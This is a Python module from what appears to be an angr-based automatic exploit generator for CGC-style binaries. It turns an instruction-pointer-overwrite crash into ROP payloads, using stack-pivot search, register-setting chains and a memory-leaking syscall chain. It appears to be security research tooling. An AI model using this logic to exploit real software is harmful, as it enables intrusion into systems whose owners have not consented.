import angr

from ..crash import Crash
from rex.exploit.payload import CircumstantialSetter, ROPSetter, ShellcodeSetter, ROPLeaker

import logging
l = logging.getLogger("rex.exploit.Exploit")

class NonExploitableCrash(Exception):
    pass

class CannotExploit(Exception):
    pass

class CannotBypassNX(CannotExploit):
    pass

class ImproperCircumstances(CannotExploit):
    pass

class Exploit(object):
    '''
    Exploit object which can leak flags or set registers
    '''

    REGISTERS = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

    def __init__(self, crash):
        '''
        :param crash: an exploitable crash object
        '''

        if not crash.exploitable():
            raise NonExploitableCrash

        self.binary = crash.binary
        self.crash = crash
        self.state = crash.state.copy()

        # dictionary of register keys to register setting exploit object
        self.exploits = { }

        # leaker exploit
        self.leaker = None

        # let's put together our rop gadgets
        self.rop_engine = angr.Project(self.binary).analyses.ROP()


    def initialize(self):

        l.info("accumulating rop gadgets")
        self.rop_engine.find_gadgets()

        self._generate_register_setters()
        self._generate_leaker()

    def set_register(self, reg, reg_val, final_ip):
        '''
        :param reg: register to set
        :param val: value to set
        :param final_ip: ip to set after setting the register
        :return: a payload which will set the register @reg to a value @val
        '''
        if reg not in self.exploits:
            raise NotImplementedError

        return self.exploits[reg].dumps(final_ip, reg_val)

    def leak_address(self, addr, length):
        '''
        :param addr: address of memory to leak
        :param length: number of bytes to leak at address
        :return: a payload which will leak length bytes at address addr
        '''

        if self.leaker is None:
            raise NotImplementedError

        return self.leaker.dumps(addr, length)

    def can_control(self, reg):
        '''
        :param reg: register we're interested if we control
        :return: True if we can produce an exploit whcih controls the register, False otherwise
        '''

        return reg in self.exploits

    def any_control(self):
        '''
        does this exploit offer anything?
        '''

        return self.leaker is not None or bool(len(self.exploits))

### EXPLOIT GENERATORS

    def _generate_leaker(self):
        '''
        generate and set the leaker exploit
        '''

        try:
            self.leaker = self._generate_a_leaker()
        except CannotExploit:
            l.warning("cannot generate a leaker exploit")

    def _generate_a_leaker(self):
        '''
        generate a leaker exploit
        '''

        try:
            return self._generate_rop_leaker()
        except CannotBypassNX:
            l.warning("unable to use rop to generate leaker")

        '''
        try:
            return self._generate_sc_leaker()
        except CannotReturnToShellcode:
            l.warning("unable to use shellcode to generate leaker")
        '''

        raise CannotExploit

    def _generate_register_setters(self):
        '''
        generate a register setter for eax, ecx, edx, ebx, esp, ebp, esi, edi
        '''

        for register in Exploit.REGISTERS:
            try:
                setter = self._generate_setter(register)
            except CannotExploit:
                l.warning("cannot generate register setting exploit for %s", register)
                continue

            self.exploits[register] = setter

    def _generate_setter(self, register):
        '''
        generate a register setter for a single register
        '''

        # first try rop setter, it's the most reliable probably
        try:
            return self._generate_rop_setter(register)
        except CannotBypassNX:
            l.warning("unable to use rop to generate exploit")

        # circumsantial setter is later, because we can't guarantee we set all values
        try:
            return self._generate_circumstantial_setter(register)
        except ImproperCircumstances:
            # we tried
            pass

        # TODO attempt to generate an exploit which uses shellcode
        '''
        try:
            return self._generate_sc_setter(register)
        except:
            l.warning("unable to use shellcode to generate exploit")
        '''

        raise CannotExploit

    def _generate_circumstantial_setter(self, register):
        '''
        generate an exploit if the circumstances are just right
        '''

        if self.crash.crash_type == Crash.IP_OVERWRITE:

            reg = getattr(self.state.regs, register)

            size = reg.size()
            test_val_0 = 0x0
            test_val_1 = (1 << size) - 1
            test_val_2 = int("1010"*16, 2) % (1 << size)
            test_val_3 = int("0101"*16, 2) % (1 << size)

            if not self.state.satisfiable(extra_constraints=(reg == test_val_0,)):
                raise ImproperCircumstances
            if not self.state.satisfiable(extra_constraints=(reg == test_val_1,)):
                raise ImproperCircumstances
            if not self.state.satisfiable(extra_constraints=(reg == test_val_2,)):
                raise ImproperCircumstances
            if not self.state.satisfiable(extra_constraints=(reg == test_val_3,)):
                raise ImproperCircumstances

            return CircumstantialSetter(self.binary, register, self.state.copy())

        l.debug("crash's vulnerability type doesn't lend itself to circumstantial exploitation")
        raise ImproperCircumstances

    def _generate_rop_leaker(self):
        '''
        generate a rop exploit for performing a leak
        '''

        if self.crash.crash_type == Crash.IP_OVERWRITE:
            return self._eip_overwrite_rop_leaker()
        else:
            l.error("crash's vulnerability exploitation method is not exploitable yet")
            raise NotImplementedError

    def _generate_rop_setter(self, register):
        '''
        generate a setter exploit for a given register
        '''

        if self.crash.crash_type == Crash.IP_OVERWRITE:
            return self._eip_overwrite_rop_setter(register)
        else:
            l.error("crash's vulnerability exploitation method is not exploitable yet")
            raise NotImplementedError

    def _eip_overwrite_rop_leaker(self):
        '''
        generate a leaker exploit using rop
        '''

        # XXX TODO really all this should be offloaded to a rop gadget searcher which is state aware

        # we need control of eax, ebx, ecx, and edx
        need_control = ['eax', 'ebx', 'ecx', 'edx', 'esi']
        rop_uncontrolled = [ ]
        # any one of these we can't control with rop?
        for register in need_control:
            try:
                self.rop_engine.set_regs(**{register: 0x41414141})
            except angr.analyses.rop.RopException:
                l.debug("unable to set register %s with rop in leaker", register)
                rop_uncontrolled.append(register)

        # for those registers which are uncontrolled by rop, can we control it circumstantially?
        # XXX special circumstances for each register
        constraints = [ ]
        for register in rop_uncontrolled:
            # if it's eax we can't control with rop, make sure it can be 2
            if register == "eax":
                constraints.append(self.state.regs.eax == 2)
            # if it's ebx we need to make sure it can stdout
            if register == "ebx":
                constraints.append(self.state.regs.ebx == 1)
            # if it's ecx we need to make sure it's practically unconstrained
            if register == "ecx":
                # TODO worry about ecx
                l.warning("cannot control ecx with rop when generating leaker")
                raise CannotBypassNX
            # if it's edx, we need to be able to set it to 0x1000 bytes
            if register == "edx":
                constraints.append(self.state.regs.edx == 0x1000)
            # if it's esi, we need to point to NULL or a writable page
            # TODO support setting to a writable page
            if register == "esi":
                constraints.append(self.state.regs.esi == 0x0)

        if not self.state.satisfiable(extra_constraints=constraints):
            l.warning("circumstantial constraints generated were unsatisfactory for a rop leaker")
            raise CannotBypassNX

        CGC_ADDR = 0x4347c000
        chain = self.rop_engine.do_syscall(2, [1, CGC_ADDR, 0x1000, 0x0], ignore_registers=rop_uncontrolled)

        exploit_state, chain_addr, offered_size = self._eip_overwrite_with_chain(chain)

        return ROPLeaker(self.binary, exploit_state, chain_addr, offered_size, rop_uncontrolled, self.rop_engine)

    def _eip_overwrite_rop_setter(self, register):
        '''
        generate a setter exploit using rop
        '''

        try:
            # set to a dummy value, the setter will generate this dynamically
            # we assume that other values won't change the size of the chain
            chain = self.rop_engine.set_regs(**{register: 0x41414141})
        except angr.analyses.rop.RopException:
            l.warning("no rop chains which set the register %s", register)
            raise CannotBypassNX

        exploit_state, chain_addr, offered_size = self._eip_overwrite_with_chain(chain)

        return ROPSetter(self.binary, register, exploit_state, chain_addr, offered_size, self.rop_engine)

    def _eip_overwrite_with_chain(self, chain):
        '''
        exploit an eip overwrite using rop
        '''

        sp = self.state.se.any_int(self.state.regs.sp)

        # first let's see what kind of stack control we have
        symbolic_stack = self.crash.stack_control()
        if len(symbolic_stack) == 0:
            l.warning("no controlled data beneath stack, need to resort to shellcode")
            raise CannotBypassNX


        chain_addr = None
        stack_pivot = None
        # loop until we can find a chain which gets us to our setter gadget
        for addr in symbolic_stack:
            # increase payload length by 4 for the final ip hijack
            chain_req = chain.payload_len + 4

            # is the space too small?
            if not symbolic_stack[addr] >= chain_req:
                continue

            # okay we have a symbolic region which fits and is below sp
            # can we pivot there?
            for gadget in self.rop_engine.gadgets:
                # let's make sure the gadget is sane

                # TODO: consult state before throwing out a gadget, some of these memory
                # accesses might be acceptable
                if len(gadget.mem_changes + gadget.mem_writes + gadget.mem_reads) > 0:
                    continue

                # if we assume all gadgets end in a 'ret' we can subtract 4 from the stack_change
                # as we're not interested in the ret's effect on stack movement, because when the
                # ret executes we'll have chain control
                jumps_to = sp + (gadget.stack_change - 4)
                # does it hit the controlled region?
                if jumps_to >= addr and jumps_to < addr + symbolic_stack[addr]:
                    # it lands in a controlled region, but does our chain fit?
                    offered_size = symbolic_stack[addr] - (jumps_to - addr)
                    if offered_size >= chain_req:
                        # we're in!
                        chain_addr = jumps_to
                        stack_pivot = gadget

                        exploit_state = self.state.copy()

                        # constrain eip to equal the stack_pivot
                        exploit_state.add_constraints(exploit_state.regs.eip == stack_pivot.addr)
                        return (exploit_state, chain_addr, offered_size)

        raise CannotBypassNX
